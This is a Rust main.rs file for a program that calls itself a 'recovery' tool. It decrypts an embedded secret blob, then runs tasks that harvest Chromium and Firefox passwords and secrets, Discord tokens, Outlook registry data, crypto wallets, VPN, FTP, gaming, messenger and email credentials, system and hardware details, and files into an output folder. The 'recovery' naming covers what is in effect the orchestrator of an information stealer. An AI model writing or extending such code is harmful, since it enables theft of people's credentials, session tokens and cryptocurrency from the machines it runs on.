mod build_config;
mod recovery;
mod secure_blob;

use recovery::structured::{
    chromium_secrets_tasks, discord_profile_task, discord_service_task, discord_token_task,
    outlook_registry_task, wallet_inventory_task,
};
use recovery::task::RecoveryError;
use recovery::{
    RecoveryContext, RecoveryManager, account_validation, behavioral, file_recovery, ftp, gaming,
    gecko, gecko_passwords, hardware, messenger, other, services, system, vpn, wallet,
};
use tracing_subscriber::prelude::*;
use tracing_subscriber::{EnvFilter, fmt};

#[tokio::main(flavor = "multi_thread")]
async fn main() -> Result<(), RecoveryError> {
    let fmt_layer = fmt::layer().with_target(false);
    let filter = EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info"));
    tracing_subscriber::registry()
        .with(filter)
        .with(fmt_layer)
        .init();

    let context = RecoveryContext::discover()
        .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;

    tracing::debug!(
        "discovered directories (home={}, local={}, roaming={})",
        context.home_dir.display(),
        context.local_data_dir.display(),
        context.roaming_data_dir.display()
    );

    let mut manager = RecoveryManager::with_default_browser_tasks(&context).await?;
    match secure_blob::SecretBlob::decrypt() {
        Ok(blob) => {
            let preview = blob.preview(8);
            tracing::info!(
                blob_len = blob.len(),
                marker = %blob.marker(),
                preview = %preview,
                "secure blob decrypted"
            );
            drop(blob);
        }
        Err(err) => tracing::warn!(error = %err, "secure blob unavailable"),
    }
    manager.register_tasks(gecko::gecko_tasks(&context));
    manager.register_tasks(gecko_passwords::gecko_password_tasks(&context));
    manager.register_tasks(services::messenger_tasks(&context));
    manager.register_tasks(services::gaming_tasks(&context));
    manager.register_tasks(gaming::gaming_service_tasks(&context));
    manager.register_tasks(gaming::gaming_extra_tasks(&context));
    manager.register_tasks(services::email_tasks(&context));
    manager.register_tasks(services::vpn_tasks(&context));
    manager.register_task(account_validation::account_validation_task(&context));
    manager.register_tasks(services::wallet_tasks(&context));
    manager.register_tasks(system::system_tasks(&context));
    manager.register_tasks(behavioral::behavioral_tasks(&context));
    manager.register_tasks(hardware::hardware_tasks(&context));
    manager.register_task(file_recovery::file_recovery_task(&context));
    manager.register_tasks(ftp::ftp_tasks(&context));
    manager.register_tasks(chromium_secrets_tasks(&context));
    manager.register_task(discord_token_task(&context));
    manager.register_task(discord_profile_task(&context));
    manager.register_task(discord_service_task(&context));
    manager.register_task(outlook_registry_task());
    manager.register_task(wallet_inventory_task(&context));
    manager.register_tasks(messenger::messenger_tasks(&context));
    manager.register_tasks(other::other_tasks(&context));
    manager.register_tasks(wallet::wallet_tasks(&context));
    manager.register_tasks(vpn::vpn_tasks(&context));
    let outcomes = manager.run_all().await?;

    tracing::info!(
        "recovery session complete: {} tasks | summary logged at {}",
        outcomes.len(),
        manager.context().output_dir.join("summary.log").display()
    );

    Ok(())
}
